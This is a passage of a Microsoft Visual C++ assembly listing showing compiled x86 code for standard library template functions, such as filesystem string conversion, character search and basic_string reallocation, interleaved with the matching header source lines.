  00004	8d 4d ff	 lea	 ecx, DWORD PTR $T1[ebp]
  00007	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QAE@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0000c	50		 push	 eax
  0000d	8d 45 0c	 lea	 eax, DWORD PTR __Input$[ebp]
  00010	50		 push	 eax
  00011	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00014	e8 00 00 00 00	 call	 ??$?0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@_W@1@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>
  00019	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 208  :     }

  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c3		 ret	 0
??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ENDP ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Stringoid_from_Source@_WU?$char_traits@_W@std@@@filesystem@std@@YA?A_PABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@@Z
_TEXT	SEGMENT
tv73 = -8						; size = 4
tv75 = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
??$_Stringoid_from_Source@_WU?$char_traits@_W@std@@@filesystem@std@@YA?A_PABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@@Z PROC ; std::filesystem::_Stringoid_from_Source<wchar_t,std::char_traits<wchar_t> >, COMDAT

; 235  :     _NODISCARD auto _Stringoid_from_Source(const basic_string_view<_EcharT, _Traits>& _Source) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 236  :         return basic_string_view<_EcharT>(_Source.data(), _Source.size()); // erase mismatching _Traits

  00006	8b 4d 0c	 mov	 ecx, DWORD PTR __Source$[ebp]
  00009	e8 00 00 00 00	 call	 ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
  0000e	89 45 fc	 mov	 DWORD PTR tv75[ebp], eax
  00011	8b 4d 0c	 mov	 ecx, DWORD PTR __Source$[ebp]
  00014	e8 00 00 00 00	 call	 ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
  00019	89 45 f8	 mov	 DWORD PTR tv73[ebp], eax
  0001c	8b 45 fc	 mov	 eax, DWORD PTR tv75[ebp]
  0001f	50		 push	 eax
  00020	8b 4d f8	 mov	 ecx, DWORD PTR tv73[ebp]
  00023	51		 push	 ecx
  00024	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00027	e8 00 00 00 00	 call	 ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  0002c	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 237  :     }

  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c3		 ret	 0
??$_Stringoid_from_Source@_WU?$char_traits@_W@std@@@filesystem@std@@YA?A_PABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@@Z ENDP ; std::filesystem::_Stringoid_from_Source<wchar_t,std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@PB_W@std@@YA$$QAPB_WAAPB_W@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@PB_W@std@@YA$$QAPB_WAAPB_W@Z PROC		; std::forward<wchar_t const *>, COMDAT

; 1560 : _NODISCARD _MSVC_INTRINSIC constexpr _Ty&& forward(remove_reference_t<_Ty>& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1562 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$forward@PB_W@std@@YA$$QAPB_WAAPB_W@Z ENDP		; std::forward<wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$__std_find_trivial@$$CB_W_W@@YAPB_WPB_W0_W@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Val$ = 16						; size = 2
??$__std_find_trivial@$$CB_W_W@@YAPB_WPB_W0_W@Z PROC	; __std_find_trivial<wchar_t const ,wchar_t>, COMDAT

; 115  : _Ty* __std_find_trivial(_Ty* _First, _Ty* _Last, const _TVal _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 116  :     if constexpr (_STD is_pointer_v<_TVal> || _STD is_null_pointer_v<_TVal>) {
; 117  :         return __std_find_trivial(_First, _Last, reinterpret_cast<uintptr_t>(_Val));
; 118  :     } else if constexpr (sizeof(_Ty) == 1) {
; 119  :         return const_cast<_Ty*>(
; 120  :             static_cast<const _Ty*>(__std_find_trivial_1(_First, _Last, static_cast<uint8_t>(_Val))));
; 121  :     } else if constexpr (sizeof(_Ty) == 2) {
; 122  :         return const_cast<_Ty*>(

  00003	0f b7 45 10	 movzx	 eax, WORD PTR __Val$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 0c	 mov	 ecx, DWORD PTR __Last$[ebp]
  0000b	51		 push	 ecx
  0000c	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0000f	52		 push	 edx
  00010	e8 00 00 00 00	 call	 ___std_find_trivial_2@12

; 123  :             static_cast<const _Ty*>(__std_find_trivial_2(_First, _Last, static_cast<uint16_t>(_Val))));
; 124  :     } else if constexpr (sizeof(_Ty) == 4) {
; 125  :         return const_cast<_Ty*>(
; 126  :             static_cast<const _Ty*>(__std_find_trivial_4(_First, _Last, static_cast<uint32_t>(_Val))));
; 127  :     } else if constexpr (sizeof(_Ty) == 8) {
; 128  :         return const_cast<_Ty*>(
; 129  :             static_cast<const _Ty*>(__std_find_trivial_8(_First, _Last, static_cast<uint64_t>(_Val))));
; 130  :     } else {
; 131  :         static_assert(_STD _Always_false<_Ty>, "Unexpected size");
; 132  :     }
; 133  : }

  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
??$__std_find_trivial@$$CB_W_W@@YAPB_WPB_W0_W@Z ENDP	; __std_find_trivial<wchar_t const ,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_To_address@PB_W@std@@YA?A_PABQB_W@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$_To_address@PB_W@std@@YA?A_PABQB_W@Z PROC		; std::_To_address<wchar_t const *>, COMDAT

; 4368 : _NODISCARD constexpr auto _To_address(const _Iter& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 4369 :     _STL_INTERNAL_STATIC_ASSERT(is_pointer_v<_Iter>);
; 4370 :     return _Val;

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]
  00006	8b 00		 mov	 eax, DWORD PTR [eax]

; 4371 : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_To_address@PB_W@std@@YA?A_PABQB_W@Z ENDP		; std::_To_address<wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Could_compare_equal_to_value_type@PB_W_W@std@@YA_NAB_W@Z
_TEXT	SEGMENT
tv66 = -8						; size = 4
__Max$1 = -4						; size = 2
__Val$ = 8						; size = 4
??$_Could_compare_equal_to_value_type@PB_W_W@std@@YA_NAB_W@Z PROC ; std::_Could_compare_equal_to_value_type<wchar_t const *,wchar_t>, COMDAT

; 5712 : _NODISCARD constexpr bool _Could_compare_equal_to_value_type(const _Ty& _Val) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 5713 :     // check whether _Val is within the limits of _Elem
; 5714 :     _STL_INTERNAL_STATIC_ASSERT(_Vector_alg_in_find_is_safe<_InIt, _Ty>);
; 5715 : 
; 5716 :     if constexpr (disjunction_v<
; 5717 : #ifdef __cpp_lib_byte
; 5718 :                       is_same<_Ty, byte>,
; 5719 : #endif // defined(__cpp_lib_byte)
; 5720 :                       is_same<_Ty, bool>, is_pointer<_Ty>, is_same<_Ty, nullptr_t>>) {
; 5721 :         return true;
; 5722 :     } else {
; 5723 :         using _Elem = _Iter_value_t<_InIt>;
; 5724 :         _STL_INTERNAL_STATIC_ASSERT(is_integral_v<_Elem> && is_integral_v<_Ty>);
; 5725 : 
; 5726 :         if constexpr (is_same_v<_Elem, bool>) {
; 5727 :             return _Val == true || _Val == false;
; 5728 :         } else if constexpr (is_signed_v<_Elem>) {
; 5729 :             // use instead of numeric_limits::min/max; avoid <limits> dependency
; 5730 :             constexpr _Elem _Min = static_cast<_Elem>(_Elem{1} << (sizeof(_Elem) * CHAR_BIT - 1));
; 5731 :             constexpr _Elem _Max = static_cast<_Elem>(~_Min);
; 5732 : 
; 5733 :             if constexpr (is_signed_v<_Ty>) {
; 5734 :                 // signed _Elem, signed _Ty
; 5735 :                 return _Min <= _Val && _Val <= _Max;
; 5736 :             } else {
; 5737 :                 // signed _Elem, unsigned _Ty
; 5738 :                 if constexpr (_Elem{-1} == static_cast<_Ty>(-1)) {
; 5739 :                     // negative values of _Elem can compare equal to values of _Ty
; 5740 :                     return _Val <= _Max || static_cast<_Ty>(_Min) <= _Val;
; 5741 :                 } else {
; 5742 :                     // negative values of _Elem cannot compare equal to values of _Ty
; 5743 :                     return _Val <= _Max;
; 5744 :                 }
; 5745 :             }
; 5746 :         } else {
; 5747 :             constexpr _Elem _Max = static_cast<_Elem>(~_Elem{0});

  00006	b8 ff ff 00 00	 mov	 eax, 65535		; 0000ffffH
  0000b	66 89 45 fc	 mov	 WORD PTR __Max$1[ebp], ax

; 5748 : 
; 5749 :             if constexpr (is_unsigned_v<_Ty>) {
; 5750 :                 // unsigned _Elem, unsigned _Ty
; 5751 :                 return _Val <= _Max;

  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Val$[ebp]
  00012	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  00015	81 fa ff ff 00
	00		 cmp	 edx, 65535		; 0000ffffH
  0001b	7f 09		 jg	 SHORT $LN3@Could_comp
  0001d	c7 45 f8 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00024	eb 07		 jmp	 SHORT $LN4@Could_comp
$LN3@Could_comp:
  00026	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@Could_comp:
  0002d	0f b6 45 f8	 movzx	 eax, BYTE PTR tv66[ebp]

; 5752 :             } else {
; 5753 :                 // unsigned _Elem, signed _Ty
; 5754 :                 if constexpr (_Ty{-1} == static_cast<_Elem>(-1)) {
; 5755 :                     // negative values of _Ty can compare equal to values of _Elem
; 5756 :                     return _Val <= _Max;
; 5757 :                 } else {
; 5758 :                     // negative values of _Ty cannot compare equal to values of _Elem
; 5759 :                     return 0 <= _Val && _Val <= _Max;
; 5760 :                 }
; 5761 :             }
; 5762 :         }
; 5763 :     }
; 5764 : }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Could_compare_equal_to_value_type@PB_W_W@std@@YA_NAB_W@Z ENDP ; std::_Could_compare_equal_to_value_type<wchar_t const *,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
_<_Val2_0>$ = 12					; size = 4
??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>, COMDAT
; _this$ = ecx

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR _<_Val2_0>$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ; std::forward<std::_Facet_base * &>
  00010	83 c4 04	 add	 esp, 4
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	8b 10		 mov	 edx, DWORD PTR [eax]
  00018	89 11		 mov	 DWORD PTR [ecx], edx
  0001a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001d	8b e5		 mov	 esp, ebp
  0001f	5d		 pop	 ebp
  00020	c2 08 00	 ret	 8
??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 4
_<_Args_1>$ = 20					; size = 1
??$_Reallocate_grow_by@V<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_c1b8c41cb4019640539cfd828748c4d4>,unsigned int,char>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 0f	 cmp	 DWORD PTR __Old_capacity$[ebp], 15 ; 0000000fH
  00099	76 4c		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	0f b6 4d 14	 movzx	 ecx, BYTE PTR _<_Args_1>$[ebp]
  000a7	51		 push	 ecx
  000a8	8b 55 10	 mov	 edx, DWORD PTR _<_Args_0>$[ebp]
  000ab	52		 push	 edx
  000ac	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  000af	50		 push	 eax
  000b0	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000b3	51		 push	 ecx
  000b4	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000b9	83 c4 04	 add	 esp, 4
  000bc	50		 push	 eax
  000bd	8b 55 d8	 mov	 edx, DWORD PTR __Raw_new$[ebp]
  000c0	52		 push	 edx
  000c1	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c4	e8 00 00 00 00	 call	 ??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z ; <lambda_c1b8c41cb4019640539cfd828748c4d4>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c9	8b 45 e4	 mov	 eax, DWORD PTR __Old_capacity$[ebp]
  000cc	50		 push	 eax
  000cd	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000d0	51		 push	 ecx
  000d1	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  000d4	52		 push	 edx
  000d5	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  000da	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000dd	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000e0	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000e3	89 08		 mov	 DWORD PTR [eax], ecx

; 4832 :         } else {

  000e5	eb 2d		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e7	0f b6 55 14	 movzx	 edx, BYTE PTR _<_Args_1>$[ebp]
  000eb	52		 push	 edx
  000ec	8b 45 10	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  000ef	50		 push	 eax
  000f0	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  000f3	51		 push	 ecx
  000f4	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000f7	52		 push	 edx
  000f8	8b 45 d8	 mov	 eax, DWORD PTR __Raw_new$[ebp]
  000fb	50		 push	 eax
  000fc	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000ff	e8 00 00 00 00	 call	 ??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z ; <lambda_c1b8c41cb4019640539cfd828748c4d4>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00104	8d 4d f0	 lea	 ecx, DWORD PTR __New_ptr$[ebp]
  00107	51		 push	 ecx
  00108	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0010b	52		 push	 edx
  0010c	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  00111	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00114	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  00117	8b e5		 mov	 esp, ebp
  00119	5d		 pop	 ebp
  0011a	c2 10 00	 ret	 16			; 00000010H
??$_Reallocate_grow_by@V<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_c1b8c41cb4019640539cfd828748c4d4>@@ID@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_c1b8c41cb4019640539cfd828748c4d4>,unsigned int,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Count$ = 20						; size = 4
__Ch$ = 24						; size = 1
??R<lambda_c1b8c41cb4019640539cfd828748c4d4>@@QBE@QADQBDIID@Z PROC ; <lambda_c1b8c41cb4019640539cfd828748c4d4>::operator(), COMDAT
; _this$ = ecx

; 3350 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3347 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3348 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);

  0001d	0f b6 45 18	 movzx	 eax, BYTE PTR __Ch$[ebp]
  00021	50		 push	 eax
  00022	8b 4d 14	 mov	 ecx, DWORD PTR __Count$[ebp]
  00025	51		 push	 ecx
  00026	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00029	03 55 10	 add	 edx, DWORD PTR __Old_size$[ebp]
  0002c	52		 push	 edx
  0002d	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z ; std::_Narrow_char_traits<char,int>::assign
  00032	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3349 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00035	c6 45 ff 00	 mov	 BYTE PTR $T1[ebp], 0
  00039	8d 45 ff	 lea	 eax, DWORD PTR $T1[ebp]
  0003c	50		 push	 eax
  0003d	8b 4d 10	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00040	03 4d 14	 add	 ecx, DWORD PTR __Count$[ebp]
  00043	03 4d 08	 add	 ecx, DWORD PTR __New_ptr$[ebp]
  00046	51		 push	 ecx
  00047	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0004c	83 c4 08	 add	 esp, 8

; 3350 :             },

  0004f	8b e5		 mov	 esp, ebp
  00051	5d		 pop	 ebp
  00052	c2 14 00	 ret	 20			; 00000014H
